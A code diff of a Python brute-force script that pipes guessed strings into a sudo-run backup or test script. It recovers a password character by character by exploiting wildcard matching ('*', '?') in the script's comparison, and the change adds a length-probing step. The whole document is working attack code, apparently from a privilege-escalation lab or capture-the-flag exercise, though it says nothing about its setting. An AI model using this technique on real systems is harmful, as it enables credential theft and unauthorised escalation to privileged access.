@@ -1,19 +1,22 @@
 import subprocess
 import string
-
+pd = []
 s=string.printable
-c = ''
-def reco(jp):
-    re = subprocess.run(f'echo {jp} | sudo /opt/scripts/mysql-backup.sh', shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
-    if 'err' in re.stderr:
-        exit(1)
-    return re.stdout
 
+def reco(jp):
+    re = subprocess.run(f'echo {jp} | sudo ./aha.sh', shell=True, stdout=subprocess.PIPE, text=True)
+    return re.stdout
 while True:
-    for i in s:
-        x=c+i+'*'
-        a=reco(x)
-        if 'failed' not in a:
-            c+=i
-            print(c)
+    rei=reco(''.join(pd))
+    if 'fail' not in rei:
+        print(len(pd))
+        break
+    pd.append('?')
+
+for j in range(len(pd)):
+    for l in s:
+        pd[j]=l
+        rei1=reco(''.join(pd))
+        if 'failed!' not in rei1:
+            print(''.join(pd))
             break
